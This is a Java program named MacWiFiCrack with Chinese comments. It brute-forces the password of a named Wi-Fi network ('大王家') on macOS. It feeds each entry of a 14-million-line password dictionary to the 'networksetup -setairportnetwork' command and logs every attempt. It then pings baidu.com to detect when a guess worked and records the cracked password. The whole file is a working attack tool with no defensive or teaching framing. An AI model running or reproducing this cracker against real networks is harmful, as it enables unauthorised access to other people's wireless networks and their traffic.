package com.roc.sale.Test.wifi;import java.io.*;import java.text.SimpleDateFormat;import java.util.ArrayList;import java.util.Date;import java.util.List;import java.util.Scanner;public class MacWiFiCrack {    public static File logFile = new File("/Users/test/wifi.log");    public static String wifiName = "大王家";//WiFi名    public static SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");    public static void main(String[] args) throws IOException, InterruptedException {        boolean parentEx = logFile.getParentFile().exists();        if (!parentEx) {            logFile.getParentFile().mkdirs();        }        if (!logFile.exists()) {            logFile.createNewFile();        }        FileWriter fw = new FileWriter(logFile, true);        Scanner sca = new Scanner(System.in);        System.out.print("请输入需要破解的wifi名称:" + wifiName);        //从口令字典读取密码        String password=null;        String path = "/Users/myProject/passWord/一千四百万密码字典.txt";        BufferedReader reader = new BufferedReader(new FileReader(path));        int index = 0;        while ((password = reader.readLine()) != null) {            String cmd = String.format("networksetup -setairportnetwork en0 %s %s", wifiName, password);            List<String> exec = execute(cmd);            fw.append("第" + index + "次："  + sdf.format(new Date()) + "," + cmd + ",res=" + exec.toString() + System.getProperty("line.separator"));            System.out.println("第" + index + "次："  + sdf.format(new Date()) + "," + cmd + ",res=" + exec.toString() + System.getProperty("line.separator"));            fw.flush();            if(exec.contains(String.format("Could not find network %s.",wifiName))){                continue;            }            if (exec.size() == 0 && ping(cmd)) {                fw.append(sdf.format(new Date()) + "," + "连接成功 wifi名称:" + wifiName + ",密码:" + password + System.getProperty("line.separator"));                System.out.println("第" + index + "次："  + sdf.format(new Date()) + "," + "连接成功 wifi名称:" + wifiName + ",密码:" + password + System.getProperty("line.separator"));                fw.flush();                break;            } else {                System.out.println("密码错误，尝试次数为"+index);                System.out.println("---------------------------");            }        }        fw.close();    }    /**     * ping 校验     */    private static boolean ping(String wifiCmd) throws IOException, InterruptedException {        /**         * 应连接wifi需要一定的时间所以睡眠3秒         */        Thread.sleep(1000 * 3);        boolean pinged = false;        String cmd = "ping www.baidu.com";        Process process = Runtime.getRuntime().exec(cmd);        BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "utf-8"));        String s = bReader.readLine();        if (s != null && s.length() > 0) {            pinged = true;        }        process.getInputStream().close();        bReader.close();        return pinged;    }    /**     * 执行cmd 命令     *     * @param cmd     * @return     * @throws IOException     */    public static List<String> execute(String cmd) throws IOException {        Process process = null;        BufferedReader bReader = null;        List<String> result = new ArrayList<String>();        try {            process = Runtime.getRuntime().exec(cmd);            bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "utf-8"));            String line = null;            while ((line = bReader.readLine()) != null) {                result.add(line);            }        } catch (IOException e) {            e.printStackTrace();        } finally {            process.getInputStream().close();            bReader.close();        }        return result;    }    /**     * 获得密码     *     * @param passStr     * @return     */    public static String getPass(Integer passStr) {        String str = String.format("%08d", passStr);        return str;    }}